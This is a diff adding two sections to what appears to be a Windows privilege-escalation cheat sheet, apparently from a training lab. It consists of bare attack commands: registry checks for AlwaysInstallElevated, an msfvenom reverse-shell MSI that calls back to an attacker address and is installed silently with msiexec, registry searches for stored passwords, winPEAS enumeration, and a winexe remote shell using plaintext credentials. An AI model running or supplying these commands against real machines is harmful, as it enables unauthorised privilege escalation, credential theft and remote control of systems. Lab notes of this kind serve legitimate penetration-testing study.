@@ -211,7 +211,25 @@ rdesktop 10.10.128.34
 admin/password123
 ```
 
+## CATEGORY "REGISTRY" - ALWAYSINSTALLELEVATED
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=53 -f msi -o reverse.msi
+copy \\10.18.5.137\\kali\reverse.msi C:\PrivEsc\reverse.msi
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
 
+## CATEGORY "PASSWORDS" - REGISTRY
+```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+ 
+reg query HKLM /f password /t REG_SZ /s
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+C:\PrivEsc\winPEASany.exe filesinfo
+
+winexe -U 'admin%password123' //10.10.6.138 cmd.exe
+```
 
 
 
